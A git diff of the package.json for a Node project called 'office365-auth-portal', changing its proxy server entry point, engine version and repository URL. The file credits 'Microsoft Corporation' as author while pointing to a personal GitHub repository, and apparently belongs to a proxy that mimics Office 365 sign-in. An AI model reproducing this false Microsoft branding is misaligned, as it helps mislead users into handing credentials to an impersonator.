@@ -2,15 +2,22 @@
   "name": "office365-auth-portal",
   "version": "1.0.0",
   "description": "Microsoft Office 365 Authentication Portal",
-  "main": "proxy_server_improved.js",
+  "main": "proxy_server.js",
   "scripts": {
-    "start": "node proxy_server_improved.js",
-    "dev": "node proxy_server_improved.js"
+    "start": "node proxy_server.js",
+    "dev": "node proxy_server.js"
   },
-  "keywords": ["office365", "authentication", "microsoft", "auth", "portal"],
+  "engines": {
+    "node": ">=22.15.0"
+  },
+  "keywords": [
+    "office365",
+    "authentication",
+    "microsoft",
+    "auth",
+    "portal"
+  ],
   "author": "Microsoft Corporation",
   "license": "MIT",
-  "engines": {
-    "node": ">=18.0.0"
-  }
+  "repository": "https://github.com/Billoxinogen18/office365-auth-portal.git"
 }
